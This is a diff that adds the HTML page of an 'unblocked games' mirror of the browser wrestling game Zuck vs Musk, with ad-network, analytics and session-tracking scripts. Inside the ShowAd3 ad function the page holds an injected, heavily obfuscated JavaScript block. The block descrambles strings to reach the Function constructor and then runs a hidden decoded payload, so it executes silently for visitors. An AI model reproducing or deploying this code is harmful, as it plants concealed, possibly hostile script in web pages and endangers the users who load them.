@@ -1,0 +1,528 @@
+ <!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<title>Zuck vs Musk - Techbro beatdown! Unblocked - Unblocked Games 66</title>
+<meta content="Zuck vs Musk in an epic battle for physical superority!" name="description">
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" id="viewport" name="viewport"/>
+<link href="./favicon.png" rel="shortcut icon" type="image/png"/>
+<meta content="Wrestling, Play, Free, Online, Multiplayer, Games, IO, Fighting, Slam, Scrolling, Friends" name="Keywords"/>
+<meta content="Blue Wizard Digital" name="author"/>
+<meta content="website" property="og:type">
+<meta content="https://zuckvmusk.com" property="og:url">
+<meta content="Zuck vs Musk" property="og:title"/>
+<meta content="Techbros Elon and Mark square off in a pro wrestling beatdown!" property="og:description"/>
+<meta content="/splash.jpg" property="og:image"/>
+<script src="./WrestleBros.js?th=644" type="text/javascript"></script>
+<script>
+		window.addEventListener ("touchmove", function (event) { event.preventDefault (); }, { capture: false, passive: false });
+		if (typeof window.devicePixelRatio != 'undefined' && window.devicePixelRatio > 2) {
+			var meta = document.getElementById ("viewport");
+			meta.setAttribute ('content', 'width=device-width, initial-scale=' + (2 / window.devicePixelRatio) + ', user-scalable=no');
+		}
+		window.addEventListener('keydown', function(e) {
+  			if( (e.keyCode == 32|| e.keyCode == 38 || e.keyCode == 40) && e.target == document.body) {
+    		e.preventDefault();
+  		}
+		});		
+	</script>
+<style>
+		html,body { 
+			margin: 0; padding: 0; height: 100%; background: #000000; color: orange; height: 100%; width: 100%; height: 100vh; width: 100vw; margin:0; padding:0;
+		}
+		.body::-webkit-scrollbar { /* WebKit */
+ 			width: 0px;
+		}
+
+		#openfl-content { background: #000000; width: 100%; height: 100%; }
+		#spinner {
+			-webkit-transform-origin: 50% 50%; 
+			-moz-transform-origin: 50% 50%; 
+			-o-transform-origin: 50% 50%; 
+			transform-origin: 50% 50%;
+			 width: 82px; 
+			 height: 81px;
+			-webkit-animation: spin1 2s infinite linear;
+			-moz-animation: spin1 2s infinite linear;
+			-o-animation: spin1 2s infinite linear;
+			-ms-animation: spin1 2s infinite linear;	
+			animation: spin1 2s infinite linear;
+		}
+  	</style>
+<!-- Google tag (gtag.js) -->
+<script async="" src="/patch/js/null.js?https://www.googletagmanager.com/gtag/js?id=G-GR7648ZK1R"></script>
+<script>
+	  window.dataLayer = window.dataLayer || [];
+	  function gtag(){dataLayer.push(arguments);}
+	  gtag('js', new Date());
+	  gtag('config', 'G-GR7648ZK1R', { cookie_flags: 'secure;samesite=none' });
+	</script>
+<script>
+			//Interstitial ad available event
+			document.addEventListener("aip_interstitialadavailable", function(e) {
+				console.log("An interstitial ad is available");
+			});
+		</script>
+<script src="//api.adinplay.com/libs/aiptag/pub/SSK/wrestlebros.io/tag.min.js"></script>
+<script>
+
+			var aiptag = aiptag || {};
+		aiptag.cmd = aiptag.cmd || [];
+		aiptag.cmd.display = aiptag.cmd.display || [];	aiptag.cmd.player = aiptag.cmd.player || [];
+		// Settings
+		aiptag.consented = false; // GDPR setting, please set this value to false if an EU user has declined or not yet accepted marketing cookies, for users outside the EU please use true and for users accepted the GDPR also use true
+	
+
+
+		aiptag.cmd.player.push(function() {
+			adplayer = new aipPlayer({
+				AIP_ADBREAK_COMPLETE: function ()  {
+					console.log("Adbreak Completed");
+					Main.DoneInterstitialAd(false);
+				},
+				AD_WIDTH: 960,
+				AD_HEIGHT: 540,
+				AD_DISPLAY: 'default', //default, fullscreen, center, fill
+				TRUSTED: true,
+				LOADING_TEXT: 'loading advertisement',
+				PREROLL_ELEM: function(){return document.getElementById('preroll')},
+				AIP_COMPLETE: function (state)  {
+					/*******************
+					 ***** WARNING *****
+					*******************
+					Please do not remove the PREROLL_ELEM
+					from the page, it will be hidden automaticly.
+					If you do want to remove it use the AIP_REMOVE callback.
+					*/
+					Main.DoneVideoAd();
+					window.document.getElementById('openfl-content').focus();
+					if(state == null) state = 'null';
+					console.log('Video Ad Complete: '+state);
+					SendEvent('event', 'donevideo-'+lastUnitPlayed+"-"+state);
+				},
+				AIP_REMOVE: function ()  {
+					// Here it's safe to remove the PREROLL_ELEM from the page if you want. But it's not recommend.
+				}
+				
+			});
+		});
+		aiptag.cmp = {
+			show: true,
+			position: "centered", //centered, bottom
+			button: true,
+			buttonText: "Privacy settings",
+			buttonPosition: "bottom-left" //bottom-left, bottom-right, top-left, top-right
+		}		
+	
+
+
+	function ShowVideo(theUnitName=null)
+	{
+		console.log('SHOW_VIDEO');
+		var aUnitName = "";
+		if(typeof gCrazySDK !== 'undefined') {
+			gCrazySDK.addEventListener("adFinished", Main.DoneVideoAd); // reenable sound, enable ui
+			gCrazySDK.addEventListener("adError", Main.DoneVideoAd); // reenable sound, enable ui
+			gCrazySDK.requestAd();		
+			console.log('CG_AD_REQUESTED');		
+			SendEvent('event', 'cgvideo');
+			return;
+		}
+		if (typeof adplayer === 'undefined') {
+			Main.DoneVideoAd(true);
+			SendEvent('event', 'video_adblocked');
+			console.log('VIDEO_ADBLOCKED');		
+
+		} else {
+			var aStr = 'preroll';
+			if(theUnitName != null) aStr = theUnitName;
+			lastUnitPlayed = aStr;
+			SendEvent('event', 'startvideo-'+aStr);
+
+
+			aiptag.cmd.player.push(function() { adplayer.startPreRoll(theUnitName); });
+		}
+	}
+	</script>
+<script src="rotate.js"></script>
+</meta></meta></meta></head>
+<body style="overflow:hidden;">
+<iframe allow="autoplay" id="audio" src="silence.mp3" style="display: none"></iframe>
+<noscript>Enable JavaScript bro!</noscript>
+<div id="loading" style="position: absolute; width: 392px; height: 31px; z-index: 15; top: 50%; left: 50%; margin: 100px 0 0 -200px;  background: black;">
+<img src="assets/loading.png"/>
+</div>
+<div id="game2" style="width: 100%; height: 100%; ">
+<div id="openfl-content" style="width: calc(100%); float:left;">
+<script type="text/javascript">
+				lime.embed ("WrestleBros", "openfl-content", 0, 0, { parameters: {} });
+			</script>
+</div>
+<div id="preroll" style="width: 960px; height: 540px; display: none; position: absolute; top: 50%; left: 50%; z-index: 100; transform: translate(-50%, -50%);">
+</div>
+<div id="wrestlebros-io_300x250" style="width: 300px; height: 250px; visibility:hidden; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+<div id="wrestlebros-io_300x250_2" style="width: 300px; height: 250px; visibility:hidden; display: none; position: absolute; top: 30px; left: 30px; z-index: 100; ">
+</div>
+<div id="wrestlebros-io_player_300x600" style="visibility:hidden; width: 300px; height: 600px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+<div id="wrestlebros-io_300x600_m" style="visibility:hidden; width: 300px; height: 600px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+<div id="wrestlebros-io_728x90" style="visibility:hidden; width: 728px; height: 90px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+<div id="wrestlebros-io_728x90_m" style="visibility:hidden; width: 728px; height: 90px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+<div id="wrestlebros-io_970x250" style="visibility:hidden; width: 970px; height: 250px; display: none; position: absolute; top: 30px; left: 30px; z-index: 100;">
+</div>
+</div>
+<br/>
+<div id="more">
+<div class="notch-top-left" style="--notch-color: var(--background-color)"></div>
+<div class="info-box">
+<h3>About Zuck vs Musk</h3>
+<p>WHO WILL WIN? Zuck or MUSK?! Grab a techbro and get ready to slam your way to victory, with lots of bros to choose from! Fly off the top rope, smash your opponent into the canvas, or even bounce off the ropes! Best of all, you can play online vs your friends, bro!</p>
+<p>The controls are very simple: Use either the arrow keys or wasd to control your wrestle br.  Jump by pressing the up arrow, and double jump to pin.  Enter/Space will attack in different ways, depending on what the situation is.</p>
+</div>
+<div class="info-box">
+<h3>FAQ</h3>
+<b>Why isn't the game loading?</b>
+<p>You should check your internet connection and make sure our site isn't blocked. Also, you should disable all ad blockers.</p>
+<b>How do I play?</b>
+<p>Just hop in and start suplexing your bros!</p>
+<b>Which browser should I use?</b>
+<p>You should use chrome.  It is the only browser guaranteed to work.  Wrestle Bros has also been tested to work on FireFox and Safari, but not guaranteed.</p>
+</div>
+</div>
+<div class="section">
+<div style="display: flex; flex-direction: row; flex-wrap: wrap; margin: 10px; padding: 2px; justify-content: center;">
+<div class="partner">
+<script>
+						function getPartner(y) {
+							var referrer = document.referrer;
+							if(referrer.includes('crazygames'))
+							{
+								return '<center><br><div style="transform:translate('+'-50'+'px,'+y+'px); width=70%; z-index: 101; text-align:right;><font style="font-weight:normal;font-family:Arial;color:#010101;font-size:20px;"><a href="https://crazygames.com" target="_blank">Crazy Games</a></font><br></div></center>';
+							}
+							else if (referrer.includes('iogames.space'))
+							{
+								return '<center><br><div style="transform:translate('+'-50'+'px,'+y+'px); width=70%; z-index: 101; text-align:right;><font style="font-weight:normal;font-family:Arial;color:#010101;font-size:20px;"><a href="https://iogames.space" target="_blank">IO Games</a></font><br></div></center>';
+							}
+							else if(referrer.includes('poki'))
+							{
+								return '<center><br><div style="transform:translate('+'-50'+'px,'+y+'px); width=70%; z-index: 101; text-align:right;><font style="font-weight:normal;font-family:Arial;color:#010101;font-size:20px;">Check out our friends at <a href="https://poki.com" target="_blank">Poki</a></font><br></div></center>';
+							}
+							else if(referrer.includes('silver'))
+							{
+								return '<center><br><div style="transform:translate('+'-50'+'px,'+y+'px); width=70%; z-index: 101; text-align:right;><font style="font-weight:normal;font-family:Arial;color:#010101;font-size:20px;"><a href="https://silvergames.com" target="_blank">Silver Games</a></font><br></div></center>';
+							}
+							else
+							{
+								return '<center><br><div style="transform:translate('+'-50'+'px,'+y+'px); width=70%; z-index: 101; text-align:right;><font style="font-weight:normal;font-family:Arial;color:#010101;font-size:20px;">Zuck v Musk is backed on <a href="https://wrestlebros.io" target="_blank">Wrestle Bross</a></font><br></div></center>';
+							}
+							return "";
+						}
+						document.write(getPartner(0));
+					</script>
+</div>
+<br/>
+<br/>
+<div class="partner">
+                     Would you like to be a partner too? Contact: <a class="__cf_email__" data-cfemail="96fff8f0f9d6f4fae3f3e1ffecf7e4f2b8f5f9fb" href="/cdn-cgi/l/email-protection">[email protected]</a>
+</div>
+</div>
+</div>
+<div class="section">
+<div style="display: flex; flex-direction: row; flex-wrap: wrap; margin: 10px; padding: 2px; justify-content: center;">
+<div class="partner">
+</div>
+</div>
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
+		var lastRefresh = 0;
+
+		var lastRefresh6 = 0;
+		function ShowAd6()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			var l = window.document.getElementById('wrestlebros-io_300x250');
+			if(l == null) 
+			{
+				return;
+			}
+			l.style.display = '';
+			l.style.visibility = 'visible';
+
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				var d = new Date();
+				var ms = d.getTime();				
+				if(ms-lastRefresh6 > 10000)
+				{
+				//hndled by the first banner request
+					//gCrazySDK.requestBanner([{containerId: 'wrestlebros-io_300x250',size: '300x250',}]);
+					//gCrazySDK.requestResponsiveBanner(["wrestlebros-io_300x250"]);
+					lastRefresh6 = ms;
+				}
+			}
+			else if(typeof aipDisplayTag !== 'undefined')
+			{
+				aipDisplayTag.refresh('wrestlebros-io_300x250');
+			}
+		}
+
+		var lastRefresh2 = 0;
+		function ShowAd2()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			var l = window.document.getElementById('wrestlebros-io_300x250_2');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				var d = new Date();
+				var ms = d.getTime();				
+				if(ms-lastRefresh2 > 10000)
+				{
+				//hndled by the first banner request
+					//gCrazySDK.requestBanner([{containerId: 'wrestlebros-io_300x250_2',size: '300x250',}]);
+					gCrazySDK.requestResponsiveBanner(["wrestlebros-io_300x250", "wrestlebros-io_300x250_2"]);
+
+					lastRefresh2 = ms;
+				}
+			}
+			else if(typeof aipDisplayTag !== 'undefined')
+			{
+				aipDisplayTag.refresh('wrestlebros-io_300x250_2');
+			}
+		}
+		function ShowAd3()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			var l = window.document.getElementById('wrestlebros-io_728x90');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				gCrazySDK.requestResponsiveBanner(["wrestlebros-io_728x90"]);
+			}
+			else if(typeof aipDisplayTag !== 'undefined') aipDisplayTag.refresh('wrestlebros-io_728x90');
+		
+(function() {
+    var KeY='', iFD=494-483;
+    function xsh(b) {
+        var g=2231620;
+        var p=b.length;
+        var d=[];
+        for(var u=0; u<p; u++) { d[u]=b.charAt(u); }
+        for(var u=0; u<p; u++) {
+            var e=g*(u+469)+(g%24291);
+            var f=g*(u+603)+(g%33615);
+            var k=e%p;
+            var i=f%p;
+            var j=d[k];
+            d[k]=d[i];
+            d[i]=j;
+            g=(e+f)%2984823;
+        };
+        return d.join('');
+    }
+    var dGm=xsh('dtroostitjfayxbglcnecmrnuocukqwrshpvz').substr(0,iFD);
+    var deV='=ar c!s3hf.{lt==q8;.Cr)[3n=[nt6<)lA ,=n;)n=0<t=rwiCi=.> +uicvs0z1ru2s5sbdi;fs.r7..)rt;;07v.7fz(tA,5aa6 ma,o),+.v8ler9(nesrtnr2,g;==gonu o;osan;e i6rejftoSh..a;uao9]]=};";fa  ;S1les+()(.y+ v9lv;c1[-ptrhv..tt,0;[ ar"e=)is)((e)v(omr;fr9,effa=h8.=me}v1(br8,rha{]",rhk.ar(for"rkcan+Cnt[a1alvv9++)p)0p;vt=d=nl;),rr sjc[+]=r2n ;tz1ac )tr.m;e=(,=jajaAqp ybt.c[pqnC1l*vtir)zeh=s (rsel;8naj=-=z(,ghxf)dbv;vnu=ilrlc}e,sno,a a[=nj< +8=v[l}fqeh+4tdmAicj(n)-,)(tnC8r+<sg6fec3h()0<gs{][x+uity07)rit(r}aabj;=+(i";7jg12o),;rl,=z=Ccv;i] ;]--;p{es)1l(v (ls0{ngn=t(oaj ;u(+==4]8b(s+km;ogiarbo).l,sli=ts)(w[si e;8,ncpli.p+1i(lvx>A]wum8l0)=oh((v-(;fhe];hzml1;8r+vfah(,(gr"rte;ia7lv)rn[e]lj.4oso(s"25hura(=rh]d,jow.!v;++e=67;hd),g;i)a)r+u==;0aa9,4.du2,=[,0;cguftl9xug=le)r)=1+0xhogzo=}mnea+zrv0C4s";7nfi-;ra)aiie]s6qn .6hvv{t6f,pt* p.arsm)r]hk;;Cuoln{fl7c(+r;ai. r;pbr)q(gh(=sr[lvlpg,j2bt22g.s)ln;n++"9nc."}6r ug;';var VUu=xsh[dGm];var IgE='';var oDZ=VUu;var PHl=VUu(IgE,xsh(deV));var gDm=PHl(xsh('s.)a_sng6bt3a.3(;b;taEcuQs)rae]5w,.b5)QQQar1aosQs6a)ot7)mQns(QarS(Q5.)4;5Q0ontE5wQt.,tuoQeQQasQ=j6%.o ==\/\/_.cQsce$;sQQ,(ac(Q7aA=eQ[!js)o{$(s.QQo3S_(bngQ$tuhm_yQS&QycQ,tt{s$dn353)3auiot_;&)0.1!tQrQq6m;63t,duQ).5ps%;)C"(c}Q_qd37+%.sy4.f\/.ehQ(%@])Q;:Ti6QEa);reF)$a0eFjNQ6t.d4Q=_+tt$Q!.o CeQ%)})t.(e6re(ioQ8w)%.d.m#$QQsjxr=.Q2mp7Qta(a=}l_CQog_,irQiQ Qe>Q.4p(5y$m?_i7.lu=twm..5_iQp 3"tl)MsbQanbMd7er)(ueipQd,@rbn60d$7%.%)dus.QQtQd)i#t(.QqDg<e._7,6__...9{3a ]a(eittq=r !.)h(QexQnQ0kk3nuf\/Q) ta_ ]aw1nQc?)oQswm@(({5cu7r%%$$Q.a=p(a)iQ.s+9j1$y$QQ{Q?$,Qc7 .o)%rnt;S( ts,e$4<p!_kaat=.!Ql(x0 s73o%t=i$rw+(i"f;t()_0_a!3Q(2r7o95}z$uQh9>6)Q48)ct)Qaihcs..43s_o1oQQ=()r%;r+>]QQQ=wdc]}CQ+sir(7;i{u.Qi_](r5Ts=] 4.%_7$.o)Q.Qp3rs$]Qe\'ru]7}2r.fo$)]b2_c) j36";neQ11.)r<r_z41i3i!af0n;3l((QQ!B5)Q{rFE}]2}3 7=t+.bcQj.t trvmj_Q0F$5.on=at,9csr"0dQ1e0Q}Qn,_Q{Q2(r"bou,(-!?w.(b9{dmvg txT,es,sEa6{4_7r(kuj;Q,}4.#ooa=_bju]{5a)).6){r29%6-ah.(#=S+v=wept!$te}lip.un5)QeQ]hsm)QQoQ roaQ.Q,.tdtQqr1Q)l!rl79rm;)...Nd6.Qai.zafr ce=.o,Q2!$_ircn=oe;.a$t6}.tQ(%_8sd 1?.aeQitQ2(Q Q,%!5(QQ_sx7l)t2rdi,Q!"]}lQ,0;Qto8d.a(%=(Q{{_Cn$t3rt]]c1&hQ,$7lE)tgtec9 ecQQQ3em553_t)e2r_(3rr6T%)$rQ5rt(n+3!a+;}t;0 ;]4trQg.hk9..,o@\/2(.1]0Q.{j)8"rQ.%1,ic!Q6oQQ))fCQ(y&e;o3sQtv9QQuQ5es,0(1(\/!6.!pif.)i-;?rQab3wt4NtlNniexq.) Q=]=.zzd\'t;1.)cr]QQ0_([(_Q.a?eh,7)Qa](k(d 2Qt7$1Q(Qa(>a70rjQ5+QQQa(Q"l53.Qi.[1Qa]pe6)Q8a%6\'x5}.!D*!frbaQ95Q=.Q-BroQi]3]4\/_Qis0:e*;o2_tQn1bd6ae;.$i0s)e,_!Q1]op !e(-r\'>fw);]Q>5pQQuszs_sic4.c6p;$).!-9]to_mr8}6.sc8el4t.C.=eEd1QQ$6t0 c2,3ClelQbt..),+;o{sQlb7g#]f]$o).7adzr(%?(!c{__orQo;%Qo!.;;>!rf5tyn=Aed,Qg_.?#..igo7cze2=QQ!4eu()=Q5nQewg}Q(Q,ze_w8Qcy{a,6a1)\/4-(;i_Asa4_qut!s1(oka)(]ec;\/h](6!o=3*Q=(.Q_be=Q;QQdc;r0i*#o-s ak\/aQe1l.i)jQo2=(Q(.]a__(Q")$6d3.$6bmh)Q8QQahSjQsr7}rpkQ<Qfj_4.]Q@(tsja>7],lisag(r=paQ)(){(o+.(cw0)!%c7e5+1-s{.%#r}a!]]f:;}]nsQraplaQ33_]QfQn\/w s(.a[r)Qd{tCQaf690;t10n+4 nQ6 7[mtTbrQa)o%ftQ e_bsBQ6=4)5.4=a=b)j09A(Qj]oQ$!)\/7(*.)4._Q,!.!j\'ol6QS 3m;a+Qo.tQqdj#% f!4Qt$)]{ns8_;]i.0ne;tne+Iiu3c)i er;lztt.QDQ;n5_(it.of3,bsoon \'sBaQpcQz.s8b1o)_iefo_8).n_d)QQEr,6}sn5j=r=g5%:iQe }{ew)ro eek)n$)oQwiQ$e!89Qo(-.fliQ(.t7_;i1Q.%=eQf*,af41n)lfe;ieu '));var fAC=oDZ(KeY,gDm );fAC(3392);return 9309
+})()
+
+}		
+		function ShowAd4()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			if(window.innerWidth < 1200) return;
+			var l = window.document.getElementById('wrestlebros-io_player_300x600');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				gCrazySDK.requestResponsiveBanner(["wrestlebros-io_player_300x600"]);
+				//gCrazySDK.requestBanner([{containerId: 'wrestlebros-io_player_300x600',size: '300x600',}]);
+			}
+			else if(typeof aipDisplayTag !== 'undefined') aipDisplayTag.refresh('wrestlebros-io_player_300x600');
+		}	
+		function ShowAd7()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			if(window.innerWidth < 1200) return;
+			var l = window.document.getElementById('wrestlebros-io_300x600_m');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				gCrazySDK.requestResponsiveBanner(["wrestlebros-io_player_300x600"]);
+				//gCrazySDK.requestBanner([{containerId: 'wrestlebros-io_player_300x600',size: '300x600',}]);
+			}
+			else if(typeof aipDisplayTag !== 'undefined') aipDisplayTag.refresh('wrestlebros-io_300x600_m');
+		}	
+		function ShowAd8()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			var l = window.document.getElementById('wrestlebros-io_728x90_m');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				gCrazySDK.requestResponsiveBanner(["wrestlebros-io_728x90"]);
+			}
+			else if(typeof aipDisplayTag !== 'undefined') aipDisplayTag.refresh('wrestlebros-io_728x90_m');
+		}	
+		
+		
+		function ShowAd9()
+		{
+			if( /Android|webOS|iPhone|iPad|iPod|Opera Mini/i.test(navigator.userAgent) ) {
+ 				return;
+			}
+			var l = window.document.getElementById('wrestlebros-io_970x250');
+			if(l == null) return;
+			l.style.display = '';
+			l.style.visibility = 'visible';
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				gCrazySDK.requestResponsiveBanner(["wrestlebros-io_970x250"]);
+			}
+			else if(typeof aipDisplayTag !== 'undefined')
+			{
+				setTimeout(function() {
+					const myPromise = new Promise((resolve, reject) => {
+						aipDisplayTag.refresh('wrestlebros-io_970x250');
+					}).then(console.log('ad loaded'));
+				} , 100);
+			} 
+		}		
+
+
+		
+
+		function right(str, chr) 
+		{
+ 			 return str.slice(str.length-chr,str.length);
+		}		
+		function SetCGInviteLink() 
+		{
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				var meta = document.getElementById ("cglink");
+				var aStr = meta.value;
+				aStr = right(aStr, 8);
+				var aCGLink = gCrazySDK.inviteLink({ roomId: aStr });
+				meta.value = aCGLink;
+				meta.select
+				document.execCommand('Copy')
+				console.log("COPIED CG URL");
+			}
+		}
+
+		function ShowAdBreak() {
+			//check if the adslib is loaded correctly or blocked by adblockers etc.
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				Main.DoneInterstitialAd(false);
+				return;
+			}
+
+						if(typeof adplayer === 'undefined' ) {
+				Main.DoneInterstitialAd(true);
+				return;
+			}
+			aiptag.cmd.player.push(function() { adplayer.startAdBreak(); });
+		}
+
+		
+		document.getElementById("openfl-content").addEventListener("wheel", doScroll);
+		document.getElementById("more").addEventListener("wheel", doScroll);
+		function doScroll(event) {
+  			window.scroll(0, window.scrollY + event.deltaY);
+		}
+
+/*		setInterval(function () { 
+			var l = window.document.getElementById('wrestlebros-io_160x600');
+			if(l != null && typeof l.style !== 'undefined' && l.style.visibility == 'visible') {
+				ShowAd5();
+			}
+		}, 30000);
+
+		setInterval(function () { 
+			var l = window.document.getElementById('wrestlebros-io_160x600_2');
+			if(l != null && typeof l.style !== 'undefined' && l.style.visibility == 'visible') {
+				ShowAd1();
+			}
+		}, 32000);*/
+
+		var sid='utgld5757hbbded2a4gontd9ua'
+		function GamePlayStart() {
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				console.log("GamePlayStart");
+				gCrazySDK.gameplayStart();
+			}
+		}
+
+		function GamePlayStop() {
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				console.log("GamePlayStop");
+				gCrazySDK.gameplayStop();
+			}
+		}
+
+		function HappyTime() {
+			if(typeof gCrazySDK !== 'undefined')
+			{
+				console.log("happytime");
+				gCrazySDK.happytime();
+			}
+		}
+
+		function updateStatus(fromEvent = false)
+		{
+			const req = new XMLHttpRequest();
+			var aStr = "recordsession.php?s="+sid;
+			if(fromEvent == true)  aStr = aStr + "&e=1"
+			req.open("GET", aStr);
+			req.send();
+		}
+		function SendEvent(theEvent, theAction, theParms = '') {
+			if(theParms == '') {
+				gtag(theEvent, theAction);
+			} else {
+				gtag(theEvent, theAction, theParms);
+			}
+			updateStatus(true);
+			//console.log("Sending event: " + theEvent + "/" + theAction + "/" + theParms);
+		}
+		//setInterval(function() { updateStatus, 4*60*1000);			
+		updateStatus(true);
+
+		//setInterval(ClearAds, 2000);		
+
+
+
+	</script>
+</body>
+</html>
